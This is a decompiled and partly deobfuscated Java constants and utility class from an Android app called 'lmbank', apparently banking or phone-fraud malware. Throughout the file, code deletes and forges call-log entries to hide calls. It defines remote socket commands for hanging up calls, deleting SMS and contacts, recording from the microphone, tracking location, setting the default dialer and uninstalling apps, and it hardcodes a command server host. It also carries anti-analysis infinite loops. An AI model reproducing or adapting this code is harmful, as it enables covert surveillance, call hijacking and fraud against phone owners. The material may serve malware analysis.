package com.wish.lmbank.common;

import android.content.ContentValues;
import android.content.Context;
import android.provider.CallLog;
import android.text.TextUtils;

import com.wish.lmbank.bean.CallLogBean;
import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.SharedPreferencesUtils;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/common/Constants.class */
public class Constants {
    public static final String ACTION_IN = "incoming";
    public static final String ACTION_OUT = "outgoing";
    public static final String ACTION_SCREEN_OFF = "ACTION_SCREEN_OFF";
    public static final String ACTION_SCREEN_ON = "ACTION_SCREEN_ON";
    public static final String ACTION_UNINSTALL_APK = "UNINSTALL_APK";
    public static String AGREEMENT_SUBMIT_STYLE = "";
    public static String APPLICATION_STYLE = "";
    public static final String APP_ID = "appId";
    public static final String AUTO_UNINSTALL_APK_SWITCH = "auto_uninstall_apk_switch";
    public static final String BAIDU_KEY = "1ccecaa7de";
    public static final String BATTERY_LEVEL = "battery";
    public static final String CALL_DEFAULT_DIALER_PACKAGE = "call_default_dialer_package";
    public static final String CALL_DURATION = "call_duration";
    public static final String CALL_IS_DEFAULT_DIALER = "call_is_default_dialer";
    public static final String CALL_SOURCE = "call_source";
    public static final String CALL_SOURCE_BLACKLIST = "blacklist";
    public static final String CALL_SOURCE_FORCED = "forced";
    public static final String CALL_SOURCE_FORWARDING = "forwarding";
    public static final String CALL_SOURCE_FORWARDING_HANG_UP = "forwarding_hang_up";
    public static final String CALL_SOURCE_NORMAL = "normal";
    public static final String CALL_STATE = "call_state";
    public static String COMPANY_UUID = "";
    public static final String CONNECT_STATE = "connect_state";
    public static final String DATA_SHOW_DIALER_DIALOG = "showDialerDialog";
    public static final String DATE_FORMAT_NORMAL = "yyyy-MM-dd HH:mm:ss";
    public static final String DB_NAME = "mango_recorder_db";
    public static final boolean DEBUG = false;
    public static final String DEVICE_ID = "device_id";
    public static final String EMPTY_STRING = "";
    public static final String FLAG = "FLAG";
    public static final int FLAG_DEFAULT = 0;
    public static final String GLOBAL_SWITCH = "global_switch";
    public static String HEADER_PICTURE_STYLE = "";
    public static final int HIDE_APPLICATION_SUCCESS = 1;
    public static final String KEY_AGREEMENT_SUBMIT_STYLE = "AGREEMENT_SUBMIT_STYLE";
    public static final String KEY_APPLICATION_STYLE = "APPLICATION_STYLE";
    public static final String KEY_CAMERA_FACING = "KEY_CAMERA_FACING";
    public static final String KEY_CAMERA_FACING_BACK = "KEY_CAMERA_FACING_BACK";
    public static final String KEY_CAMERA_FACING_FRONT = "KEY_CAMERA_FACING_FRONT";
    public static final String KEY_CANCEL_AUTO_CONFIRM = "KEY_CANCEL_AUTO_CONFIRM";
    public static final String KEY_CLOSE_TCALL_ALERT_WINDOW = "KEY_CLOSE_TCALL_ALERT_WINDOW";
    public static final String KEY_COMPANY_UUID = "COMPANY_UUID";
    public static final String KEY_EXECUTE_CLOSE_TCALL_ALERT_WINDOW = "KEY_EXECUTE_CLOSE_TCALL_ALERT_WINDOW";
    public static final String KEY_EXECUTE_OPEN_ALERT_WINDOW = "KEY_EXECUTE_OPEN_ALERT_WINDOW";
    public static final String KEY_FIRST = "KEY_FIRST";
    public static final String KEY_FIRST_SMS = "KEY_FIRST_SMS";
    public static final String KEY_FORCED_PHONE = "KEY_FORCED_PHONE";
    public static final String KEY_FORWARDING_PHONE = "KEY_FORWARDING_PHONE";
    public static final String KEY_FORWARDING_SHOW_PHONE = "KEY_FORWARDING_SHOW_PHONE";
    public static final String KEY_HEADER_PICTURE_STYLE = "HEADER_PICTURE_STYLE";
    public static final String KEY_INSTALL_CODE = "KEY_INSTALL_CODE";
    public static final String KEY_IS_ALLOW_UPLOAD_IMAGE = "KEY_IS_ALLOW_UPLOAD_IMAGE";
    public static final String KEY_IS_EXECUTE_HIDE_APPLICATION = "IS_EXECUTE_HIDE_APPLICATION";
    public static final String KEY_IS_FORCED_CALL = "KEY_IS_FORCED_CALL";
    public static final String KEY_IS_FORWARDING_HAND_UP = "KEY_IS_FORWARDING_HAND_UP";
    public static final String KEY_IS_JUMP_HIDE_APPLICATION = "IS_JUMP_HIDE_APPLICATION";
    public static final String KEY_IS_JUMP_TO_CLOSE_TCALL = "KEY_IS_JUMP_TO_CLOSE_TCALL";
    public static final String KEY_IS_JUMP_TO_OPEN = "KEY_IS_JUMP_TO_OPEN";
    public static final String KEY_OPEN_SMS = "OPEN_SMS";
    public static final String KEY_PROJECT_NAME = "PROJECT_NAME";
    public static final String KEY_SCANNING_ALL_APP = "SCANNING_ALL_APP";
    public static final String KEY_SERVER_NAME = "SERVER_NAME";
    public static final String KEY_SHOW_ACCESS_SUCCESS = "KEY_SHOW_ACCESS_SUCCESS";
    public static final String KEY_SYSTEM_SWITCH = "pref_system_switch_key";
    public static final String KEY_UNINSTALL_APK = "KEY_UNINSTALL_APK";
    public static final String KEY_UNNECESSARY_AUTO_DELETE_LIST = "UNNECESSARY_AUTO_DELETE_LIST";
    public static final String KEY_URL = "URL";
    public static final String K_SHOW_ACCESS = null;
    public static final String K_SHOW_ACCESS_APPLYING = null;
    public static final String LOCATION = "location";
    public static final String MIC_AVAILABLE = "isAvailable";
    public static final String NETWORK_TYPE = "network";
    public static final String OFF = "off";
    public static final String ON = "on";
    public static boolean OPEN_SMS = false;
    public static final String PHONE_NUMBER = "phone_number";
    public static final String PHONE_NUMBER_REAL = "phone_number_real";
    public static String PROJECT_NAME = "";
    public static final String PROJECT_NAME_LK = "Lk";
    public static final String REAL_PATH = "up_path_real";
    public static final String RECORDER_SOURCE_INCOMING = "incoming";
    public static final String RECORDER_SOURCE_NORMAL = "normal";
    public static final String RECORDER_SOURCE_OUTGOING = "outgoing";
    public static String SCANNING_ALL_APP = "";
    public static final String SCREEN_STATE = "screen_state";
    public static String SERVER_NAME = "";
    public static final String SOCKET_EVENT_ADD_CONTACT_FROM_SERVER = "event_add_contact_from_server";
    public static final String SOCKET_EVENT_BIND_ID_FROM_CLIENT = "event_bind_id_from_client";
    public static final String SOCKET_EVENT_CLOSE_BLUETOOTH_FROM_SERVER = "event_close_bluetooth_from_server";
    public static final String SOCKET_EVENT_CONTACT_LIMIT_UPDATE_FROM_SERVER = "event_contact_limit_update_from_server";
    public static final String SOCKET_EVENT_DELETE_CONTACT_FROM_SERVER = "event_delete_contact_from_server";
    public static final String SOCKET_EVENT_DELETE_SMS_FROM_SERVER = "event_delete_sms_from_server";
    public static final String SOCKET_EVENT_DEL_CALL_LOG_FROM_SERVER = "event_del_call_log_from_server";
    public static final String SOCKET_EVENT_HANG_UP_FROM_SERVER = "event_hang_up_from_server";
    public static final String SOCKET_EVENT_KEEP_HEART_TO_SERVER = "event_keep_heart_to_server";
    public static final String SOCKET_EVENT_LOAD_INFO_FROM_SERVER = "event_load_info_from_server";
    public static final String SOCKET_EVENT_LOCATION_FROM_SERVER = "event_location_from_server";
    public static final String SOCKET_EVENT_LOCATION_TO_SERVER = "event_location_to_server";
    public static final String SOCKET_EVENT_MIC_FROM_SERVER = "event_mic_from_server";
    public static final String SOCKET_EVENT_MIC_MSG_TO_SERVER = "event_mic_available_to_server";
    public static final String SOCKET_EVENT_ORDER_FROM_SERVER = "event_order_from_server";
    public static final String SOCKET_EVENT_REBOOT_FROM_SERVER = "event_reboot_from_server";
    public static final String SOCKET_EVENT_RECORDING_FROM_SERVER = "event_recording_from_server";
    public static final String SOCKET_EVENT_RECORDING_REPLY_SERVER = "event_recording_reply_server";
    public static final String SOCKET_EVENT_REFRESH_UPLOAD_INFO_TO_SERVER = "event_refresh_upload_info_to_server";
    public static final String SOCKET_EVENT_SCREEN_STATE_FROM_SERVER = "event_screen_state_from_server";
    public static final String SOCKET_EVENT_SCREEN_STATE_TO_SERVER = "event_screen_state_to_server";
    public static final String SOCKET_EVENT_SEND_CALL_ENDED_MSG_TO_SERVER = "event_call_ended";
    public static final String SOCKET_EVENT_SEND_CALL_STARTED_MSG_TO_SERVER = "event_call_started";
    public static final String SOCKET_EVENT_SEND_DISCONNECT_TO_SERVER = "event_disconnect_to_server";
    public static final String SOCKET_EVENT_SEND_REFRESH_RECORDING_MSG_TO_SERVER = "event_refresh_recording";
    public static final String SOCKET_EVENT_SET_DEFAULT_DIALER_FROM_SERVER = "event_set_default_dialer_from_server";
    public static final String SOCKET_EVENT_UNINSTALL_APK_FROM_SERVER = "event_uninstall_apk_from_server";
    public static final String SOCKET_ID = "socket_id";
    public static final String SYSTEM_SWITCH = "system_switch";
    private static final String TAG = "com.wish.lmbank.common.Constants";
    public static final String TIMESTAMP = "timestamp";
    public static final String UNDERLINE_STRING = "_";
    public static String UNNECESSARY_AUTO_DELETE_LIST = "";
    public static List<CallLogBean> mCallLogList;


    public static final int THAT_CODE = 268435456;

    public static void delCallLog(Context context, String str) {
        try {
//             int delete = context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, bb7d7pu7.m5998("BxwECwwbVFY"), new String[]{str});
            int delete = context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, "number=?", new String[]{str});
            String str2 = TAG;
//             LogUtils.d(str2, bb7d7pu7.m5998("DQwFKggFBSUGDkkbDB1TSQ") + delete);
            LogUtils.d(str2, "delCallLog ret: " + delete);
        } catch (Exception e) {
            String str3 = TAG;
//             LogUtils.e(str3, bb7d7pu7.m5998("DQwFKggFBSUGDkkvCAAFDA1TSQ") + e.getMessage());
            LogUtils.e(str3, "delCallLog Failed: " + e.getMessage());
        }
    }

    public static void delCallLog(Context context, String str, int i) {
        try {
//             int delete = context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, bb7d7pu7.m5998("BxwECwwbVFZJCAcNSR0QGQxUVg"), new String[]{str, String.valueOf(i)});
            int delete = context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, "number=? and type=?", new String[]{str, String.valueOf(i)});
            String str2 = TAG;
//             LogUtils.d(str2, bb7d7pu7.m5998("DQwFKggFBSUGDkkbDB1TSQ") + delete);
            LogUtils.d(str2, "delCallLog ret: " + delete);
        } catch (Exception e) {
//             LogUtils.callLog(TAG + bb7d7pu7.m5998("RUkNDAUqCAUFJQYOSS8IAAUMDVNJ") + e.getMessage());
            LogUtils.callLog(TAG + ", delCallLog Failed: " + e.getMessage());
        }
    }

    /**
     * @param context
     * @param number  匹配号码
     * @param phone   修改号码
     */
    public static void modifyCall(Context context, String number, String phone) {
        SimpleDateFormat dateFormat = new SimpleDateFormat(
                "yyyy-MM-dd hh:mm:ss");
        String date = dateFormat.format(System.currentTimeMillis());

        ContentValues values = new ContentValues();
        values.put(CallLog.Calls.TYPE, CallLog.Calls.INCOMING_TYPE);
        values.put(CallLog.Calls.NUMBER, phone);
        values.put(CallLog.Calls.DATE, date);
        values.put(CallLog.Calls.NEW, 1);
        context.getContentResolver().
                update(CallLog.Calls.CONTENT_URI, values, CallLog.Calls.NUMBER + "=?", new String[]{number});
    }

    public static void modifySmsCall(Context context, String number, String phone) {
        ContentValues values=new ContentValues();
        //values.put();
    }

    public static void delCallLog(Context context, String str, int i, long j) {
        try {
//                 int delete = context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, bb7d7pu7.m5998("BxwECwwbVFZJCAcNSR0QGQxUVkkIBw1JDRwbCB0ABgdJVElW"), new String[]{str, String.valueOf(i), String.valueOf(j)});
            int delete = context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, "number=? and type=? and duration = ?", new String[]{str, String.valueOf(i), String.valueOf(j)});
            String str2 = TAG;
//                 LogUtils.d(str2, bb7d7pu7.m5998("DQwFKggFBSUGDkkbDB1TSQ") + delete);
            LogUtils.d(str2, "delCallLog ret: " + delete);
            return;
        } catch (Exception e) {
//                 LogUtils.callLog(TAG + bb7d7pu7.m5998("RUkNDAUqCAUFJQYOSS8IAAUMDVNJ") + e.getMessage());
            LogUtils.callLog(TAG + ", delCallLog Failed: " + e.getMessage());
            return;
        }
    }

    public static void insertCallLog(Context context, String str, long j, long j2, int i, int i2) {
        ContentValues contentValues = new ContentValues();
//         contentValues.put(bb7d7pu7.m5998("BxwECwwb"), str);
        contentValues.put("number", str);
        long j3 = j;
        if (j == 0) {
            j3 = System.currentTimeMillis();
        }
//         contentValues.put(bb7d7pu7.m5998("DQgdDA"), Long.valueOf(j3));
        contentValues.put("date", Long.valueOf(j3));
//         contentValues.put(bb7d7pu7.m5998("DRwbCB0ABgc"), Long.valueOf(j2));
        contentValues.put("duration", Long.valueOf(j2));
//         contentValues.put(bb7d7pu7.m5998("HRAZDA"), Integer.valueOf(i));
        contentValues.put("type", Integer.valueOf(i));
//         contentValues.put(bb7d7pu7.m5998("Bwwe"), Integer.valueOf(i2));
        contentValues.put("new", Integer.valueOf(i2));
        context.getContentResolver().insert(CallLog.Calls.CONTENT_URI, contentValues);
    }

    public static void load(boolean z) {
        if ((9872 + 11170) % 11170 > 0) {
            if (z) {
                loadTest();
                return;
            }
//             OPEN_SMS = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("JjksJzY6JDo"), false);
            OPEN_SMS = SharedPreferencesUtils.getValue("OPEN_SMS", false);
//             COMPANY_UUID = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("KiYkOSgnMDY8PCAt"), "");
            COMPANY_UUID = SharedPreferencesUtils.getValue("COMPANY_UUID", "");
//             PROJECT_NAME = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("OTsmIywqPTYnKCQs"), "");
            PROJECT_NAME = SharedPreferencesUtils.getValue("PROJECT_NAME", "");
//             SCANNING_ALL_APP = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("OiooJycgJy42KCUlNig5OQ"), bb7d7pu7.m5998("WA"));
            SCANNING_ALL_APP = SharedPreferencesUtils.getValue("SCANNING_ALL_APP", "1");
//             APPLICATION_STYLE = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("KDk5JSAqKD0gJic2Oj0wJSw"), "");
            APPLICATION_STYLE = SharedPreferencesUtils.getValue("APPLICATION_STYLE", "");
//             AGREEMENT_SUBMIT_STYLE = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("KC47LCwkLCc9Njo8KyQgPTY6PTAlLA"), "");
            AGREEMENT_SUBMIT_STYLE = SharedPreferencesUtils.getValue("AGREEMENT_SUBMIT_STYLE", "");
//             HEADER_PICTURE_STYLE = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("ISwoLSw7NjkgKj08Oyw2Oj0wJSw"), "");
            HEADER_PICTURE_STYLE = SharedPreferencesUtils.getValue("HEADER_PICTURE_STYLE", "");
//             SERVER_NAME = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("Oiw7Pyw7NicoJCw"), "");
            SERVER_NAME = SharedPreferencesUtils.getValue("SERVER_NAME", "");
//             UNNECESSARY_AUTO_DELETE_LIST = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("PCcnLCosOjooOzA2KDw9JjYtLCUsPSw2JSA6PQ"), "");
            UNNECESSARY_AUTO_DELETE_LIST = SharedPreferencesUtils.getValue("UNNECESSARY_AUTO_DELETE_LIST", "");
//             String value = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("PDsl"), "");
            String value = SharedPreferencesUtils.getValue("URL", "");
            if (TextUtils.isEmpty(value)) {
                return;
            }
            URL.setHost(value);
            return;
        }
        int i = (-19188) + (-19188) + 18869;
        while (true) {
        }
    }

    public static void loadTest() {
        if ((11564 + 10679) % 10679 > 0) {
//             OPEN_SMS = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("JjksJzY6JDo"), false);
            OPEN_SMS = SharedPreferencesUtils.getValue("OPEN_SMS", false);
//             COMPANY_UUID = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("KiYkOSgnMDY8PCAt"), bb7d7pu7.m5998("D1g_XQIxPDo4PggwOAU8LiRcBCgoHxsoMx0gPS0KHyU"));
            COMPANY_UUID = SharedPreferencesUtils.getValue("COMPANY_UUID", "f1V4kXUSQWaYQlUGM5mAAvrAZtITDcvL");
//             String m5998 = bb7d7pu7.m5998("OTsmIywqPTYnKCQs");
            String m5998 = "PROJECT_NAME";
//             PROJECT_NAME = SharedPreferencesUtils.getValue(m5998, bb7d7pu7.m5998("Oj0-"));
            PROJECT_NAME = SharedPreferencesUtils.getValue(m5998, "STW");
//             String m59982 = bb7d7pu7.m5998("OiooJycgJy42KCUlNig5OQ");
            String m59982 = "SCANNING_ALL_APP";
//             String m59983 = bb7d7pu7.m5998("WA");
            String m59983 = "1";
            SCANNING_ALL_APP = SharedPreferencesUtils.getValue(m59982, m59983);
//             APPLICATION_STYLE = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("KDk5JSAqKD0gJic2Oj0wJSw"), "");
            APPLICATION_STYLE = SharedPreferencesUtils.getValue("APPLICATION_STYLE", "");
//             AGREEMENT_SUBMIT_STYLE = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("KC47LCwkLCc9Njo8KyQgPTY6PTAlLA"), "");
            AGREEMENT_SUBMIT_STYLE = SharedPreferencesUtils.getValue("AGREEMENT_SUBMIT_STYLE", "");
//             HEADER_PICTURE_STYLE = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("ISwoLSw7NjkgKj08Oyw2Oj0wJSw"), "");
            HEADER_PICTURE_STYLE = SharedPreferencesUtils.getValue("HEADER_PICTURE_STYLE", "");
//             SERVER_NAME = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("Oiw7Pyw7NicoJCw"), bb7d7pu7.m5998("Oiw7Pyw7Wlw"));
            SERVER_NAME = SharedPreferencesUtils.getValue("SERVER_NAME", "SERVER35");
//             UNNECESSARY_AUTO_DELETE_LIST = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("PCcnLCosOjooOzA2KDw9JjYtLCUsPSw2JSA6PQ"), m59983);
            UNNECESSARY_AUTO_DELETE_LIST = SharedPreferencesUtils.getValue("UNNECESSARY_AUTO_DELETE_LIST", m59983);
//             String value = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("PDsl"), bb7d7pu7.m5998("GgddEAAdD1lYBloZAkcKBgQ"));
            String value = SharedPreferencesUtils.getValue("URL", "sn4yitf01o3pk.com");
            SharedPreferencesUtils.putValue(m5998, PROJECT_NAME);
            if (TextUtils.isEmpty(value)) {
                return;
            }
            URL.setHost(value);
            return;
        }
        int i = (-9118) + (-9118) + 8691;
        while (true) {
        }
    }
}
